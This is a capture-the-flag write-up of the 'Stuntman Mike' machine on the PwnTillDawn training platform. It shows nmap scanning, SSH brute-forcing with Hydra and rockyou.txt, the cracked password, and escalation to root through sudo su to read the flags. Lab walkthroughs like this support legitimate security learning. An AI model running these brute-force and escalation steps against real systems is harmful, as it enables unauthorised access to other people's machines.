+++ 
author = ['Abdallah Adham']
title = "Stuntman Mike PwnTillDawn Writeup"
date = 2022-12-06
description = "This is a writeup of the Stuntman Mike machine in PwnTillDawn Online platform."
draft = false
slug = ""

tags = [
	'PwnTillDawn',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Stuntman_Mike_PwnTillDawn/stuntman_mike_pwntilldawn.JPG"
+++

---

This writeup has been authorized by the **PwnTillDawn Crew**! 

Check their websites for more information!
1. [wizlynxgroup](https://www.wizlynxgroup.com/)
2. [online.pwntilldawn](https://online.pwntilldawn.com/)

## Target Information

| Name | IP | Operating System | Difficulty| 
|----------- | ----------- | ----------- |  -----------|
|**Stuntman Mike**| **10.150.150.166** | **Linux** | **Easy** |

## Scanning

### Nmap Scanning

```bash
$ nmap -p- -A 10.150.150.166
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 13:47 EST
Nmap scan report for 10.150.150.166
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 (protocol 2.0)
| ssh-hostkey: 
|   2048 b79e99ed7ee0d583adc9ba7cf1bc4406 (RSA)
|   256 7e53597b2d6c3bd72128cbcb78af9978 (ECDSA)
|_  256 c5d22d04f969404c153436fe831ff344 (ED25519)
8089/tcp open  ssl/http Splunkd httpd
|_http-title: splunkd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:15:13
|_Not valid after:  2022-10-24T09:15:13
| http-robots.txt: 1 disallowed entry 
|_/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1715.34 seconds

```

It looks like there is nothing opened except **SSH** and **HTTPS** ports, So Let's enumerate those services !

## Enumeration

### SSH Enumeration

#### Banner Grabbing

```bash
$ nc -vn 10.150.150.166 22
(UNKNOWN) [10.150.150.166] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1
```

Olay, So for assurance that the **SSH** version is `SSH-2.0-OpenSSH_7.6p1`.

#### SSH Connect (Fail)

So, I have tried to connect via **SSH** with a **root** user although i don't know any passwords.

_FLAG35_
```bash
$ ssh root@10.150.150.166                                                                                                        
The authenticity of host '10.150.150.166 (10.150.150.166)' can't be established.
ED25519 key fingerprint is SHA256:wCj0PIambullovu4ygX2+b6IVT8d8x2gEDeOB2D3OE4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.150.150.166' (ED25519) to the list of known hosts.
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b269XXXXXX
root@10.150.150.166's password:
```

But what is not expected is that i have got the **username** and **FLAG35** as a response to the connection.

Now, I think we can **bruteforce** the password to the **mike**'s user **SSH** credientials.

## Exploitation

### SSH Bruteforce (Hydra)

I have used **Hydra** tool to do the **SSH** bruteforce attack on the victim's machine with the username as **mike** and the **wordlist** as **rockyou.txt**.

```bash
$ hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.150.150.166 -t 4 ssh
```

And the result is postive!
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 15:23:40
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.150.150.166:22/
[22][ssh] host: 10.150.150.166   login: mike   password: babygirl

1 of 1 target successfully completed, 1 valid password found
```

We have mike's credientials now!

```bash
[22][ssh] host: 10.150.150.166   login: mike   password: babygirl
```

### SSH Connect (Success)

Now, Let's connect via **SSH**!

```bash
$ ssh mike@10.150.150.166
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2XXXXXXX
mike@10.150.150.166's password: babygirl
```

Boom! We got the SSH shell!
 ```bash
mike@stuntmanmike:~$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Let's get the user's flag!

_FLAG36_
```BASH
mike@stuntmanmike:~$ ls
FLAG36
mike@stuntmanmike:~$ cat FLAG36 
8cff2cce1a88a54db986XXXXXXXXXXXXXXX
```

Now, It is time to escalate our privilages to **root** in order to get the last flag!

## Post-Exploitation

### Sudo -l

So, I have tried to know what is my **privilages** that i can run with **sudo** and the result is:

```bash 
mike@stuntmanmike:~$ sudo -l
[sudo] password for mike: babygirl
Matching Defaults entries for mike on stuntmanmike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on stuntmanmike:
    (ALL : ALL) ALL
```

I can run everthing with **sudo**!

So, I have switched myself to **root** by using this command:

```bash
mike@stuntmanmike:~$ sudo su
root@stuntmanmike:/home/mike# id
uid=0(root) gid=0(root) groups=0(root)
```

Now, I am **root**!

Let's get the last **flag** that is located in the **root**'s directory!

_FLAG37_
```bash
root@stuntmanmike:/home/mike# cd /root
root@stuntmanmike:~# ls
CAM.shortcut  FLAG37 
root@stuntmanmike:~# cat FLAG37 
28d10397e475a50fc0dXXXXXXXXXXXXXXXXX
```

_Pwned_

![pwned](post/Stuntman_Mike_PwnTillDawn/imgs/1.JPG)